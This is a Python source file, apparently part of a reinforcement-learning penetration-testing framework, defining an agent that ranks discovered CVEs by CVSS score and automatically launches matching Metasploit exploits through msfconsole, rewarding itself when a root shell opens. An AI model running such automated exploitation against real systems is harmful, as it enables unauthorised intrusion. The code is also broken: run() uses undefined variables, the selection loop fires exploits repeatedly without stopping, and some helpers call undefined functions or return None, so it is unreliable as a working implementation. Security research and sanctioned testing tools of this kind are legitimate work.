import random
import subprocess

from agents.base_agent import BaseAgent

class ExploitAgent(BaseAgent):
    """
    Agent that attempts to exploit the target using the best known CVE.
    It selects the highest CVSS vulnerability and tests its effect.
    """

    def __init__(self, blackboard_api, replay_buffer, policy_model, state_encoder, action_encoder, command_cache, model, metasploit_dataset, exploitdb_dataset, full_exploit_dataset):
        super().__init__(
            name="ExploitAgent",
            action_space=[],
            blackboard_api=blackboard_api,
            replay_buffer=replay_buffer,
            policy_model=policy_model,
            state_encoder=state_encoder,
            action_encoder=action_encoder,
            command_cache=command_cache,
            model=model
        )
        self.metasploit_dataset = metasploit_dataset
        self.exploitdb_dataset = exploitdb_dataset
        self.full_exploit_dataset = full_exploit_dataset

    def should_run(self):
        return True

    def get_reward(self, prev_flat: dict, action: str, next_flat: dict) -> float:
        # בדוק האם נוספו CVEs שנכשלו
        prev_failed = {k: v for k, v in prev_flat.items() if k.startswith("failed_cve_idx")}
        next_failed = {k: v for k, v in next_flat.items() if k.startswith("failed_cve_idx")}
        
        new_failed = set(next_failed.values()) - set(prev_failed.values())

        if new_failed:
            print(f"[Reward] New failed CVEs detected: {new_failed}")
            return -2.0  # ניסיון כושל חדש
        
        # אם אין CVE שנכשל עכשיו – נבדוק אם shell נפתח
        before_shell = prev_flat.get("attack_impact.shell_opened", 0.0)
        after_shell = next_flat.get("attack_impact.shell_opened", 0.0)

        if before_shell < 0.5 and after_shell >= 0.5:
            print("[Reward] Shell opened – success!")
            return 10.0

        return -0.5  # ניסיון שלא נכשל אבל גם לא הצליח

    def run(self):
        print("[+] ExploitAgent running...")
        state = self.blackboard_api.get_state_for_agent(self.name)
        vulnerabilities = state.get("vulnerabilities_found", [])

        if not vulnerabilities:
            print("[!] No CVEs found — skipping.")
            return

        # מיון לפי CVSS בסדר יורד
        sorted_vulns = sorted(vulnerabilities, key=lambda v: v.get("cvss", 0), reverse=True)

        exploit_info = None
        selected_cve = None
        source = None

        for vuln in sorted_vulns:
            cve_id = vuln["cve"]
            found = self.find_exploit(cve_id)
            if found:
                if found.get("metasploit"):
                    exploit_info = found["metasploit"]
                    selected_cve = cve_id
                    source = "metasploit"
                    success, output = self.run_metasploit_exploit_script(exploit_info)
                    #break
                elif found.get("exploitdb"):
                    exploit_info = found["exploitdb"]
                    selected_cve = cve_id
                    source = "exploitdb"
                    #break 
            print(f"[!] No exploit found for {cve_id} — trying next.")

        if not exploit_info:
            print("[✗] No exploits found for any CVE.")
            # כישלון עבור כולם
            state["failed_CVEs"] = [v["cve"] for v in sorted_vulns]
            self.blackboard_api.update_state(self.name, state)
            return

        print(f"[ExploitAgent] Selected CVE: {selected_cve} from {source}")
        self.last_action = f"EXPLOIT_{selected_cve}"
        self.actions_history.append(self.last_action)

        # ניסיון הרצה לפי המקור
        if source == "metasploit":
            success, output = self.run_metasploit_exploit_script(exploit_info)
        elif source == "exploitdb":
            success, output = self.run_exploitdb_exploit_script(exploit_info)
        else:
            print("[!] Unknown exploit source.")
            success = False

        # נעדכן את state בהתאם
        if success:
            shell = {"shell_type": "bash", "shell_access_level": "root"}
        else:
            shell = {}

        state["attack_impact"] = {"shell_opened": shell}
        self.blackboard_api.update_state(self.name, state)

        # הצפנה של מצב, חישוב תגמול, עדכון replay buffer
        prev_vector = self.state_encoder.encode(prev_state_dict, actions)
        next_vector = self.state_encoder.encode(next_state_dict, actions)
        reward = self.get_reward(prev_vector, action, next_vector)

        experience = {
            "state": encoded_state,
            "action": 0,  # אין פעולה ממשית - רק סימולציה
            "reward": reward,
            "next_state": encoded_next_state
        }
        self.replay_buffer.add_experience(**experience)

        print(f"[ExploitAgent] Exploit {'Succeeded' if success else 'Failed'} — Reward: {reward:.2f}")

    def get_exploit_path_for_cve(self, cve_id):
        exploit = self.find_exploit(cve_id)
        if exploit is None:
            exploit = check_exploitdb_dataset(cve_id)
        return exploit
    
    def check_metasploit_dataset(self, cve_id):
        """
        מחפש את ה־CVE הרצוי בתוך מאגר Metasploit ומחזיר את הרשומה המלאה אם נמצא.

        Args:
            cve_id (str): מזהה CVE לחיפוש (למשל 'CVE-2018-14665').

        Returns:
            dict | None: רשומת אקפלויט תואמת או None אם לא נמצא.
        """
        for entry in self.metasploit_dataset:
            if entry.get("cve") == cve_id:
                return entry
        return None
    
    def run_metasploit_exploit_script(self, exploit_info):
        """
        מריץ את האקפלויט בפקודה אחת דרך msfconsole -q -x "<פקודות>", בלי שימוש ב־pexpect.
        """
        exploit_path = exploit_info.get("exploit_path")
        payload = exploit_info.get("default_payload")
        options = exploit_info.get("required_options", {})

        if not exploit_path:
            print("[✗] exploit_path is missing.")
            return False, ""

        print(f"[⚙️] Launching Metasploit exploit: {exploit_path}")

        # הרכבת מחרוזת פקודות
        commands = [f"use {exploit_path}"]

        if payload:
            commands.append(f"set PAYLOAD {payload}")

        for key, val in options.items():
            if val:
                commands.append(f"set {key} {val}")

        commands.append("run -z")   # -z = no interaction
        commands.append("exit")     # יציאה מ־msfconsole

        full_command = "; ".join(commands)

        try:
            result = subprocess.run(
                ["msfconsole", "-q", "-x", full_command],
                capture_output=True,
                text=True,
                timeout=90
            )
            output = result.stdout + result.stderr
            print(output)
            success = any(term in output.lower() for term in ["session", "exploit completed", "shell"])
            if success:
                print("[✓] Exploit Succeeded")
            else:
                print("[✗] Exploit Failed")

            return success, output

        except subprocess.TimeoutExpired:
            print("[!] Timeout expired while running exploit.")
            return False, ""
        except Exception as e:
            print(f"[!] Error: {e}")
            return False, ""
    
    def run_exploitdb_exploit_script(self, exploit_info):
        return None
    def check_exploitdb_dataset(self, cve_id):
        return None

    def find_exploit(self, cve_id):
        """
        Searches both Metasploit and ExploitDB datasets for a given CVE ID.

        Args:
            cve_id (str): The CVE identifier to search for.

        Returns:
            dict | None: A merged dictionary with keys 'metasploit' and/or 'exploitdb'.
        """
        result = {"cve": cve_id, "metasploit": None, "exploitdb": None}

        # חיפוש במאגר Metasploit
        for entry in self.metasploit_dataset:
            if entry.get("cve") == cve_id:
                result["metasploit"] = entry
                break

        # חיפוש ב־ExploitDB
        """
        for entry in self.exploitdb_dataset:
            if not isinstance(entry, dict):
                continue
            if entry.get("cve") == cve_id:
                result["exploitdb"] = {
                    "exploit_path": entry.get("exploit_path", ""),
                    "cve": cve_id,
                    "source": "exploitdb"
                }
                break
                """
        # אם לא נמצא באף אחד – מחזירים None
        if not result["metasploit"] and not result["exploitdb"]:
            return None

        return result
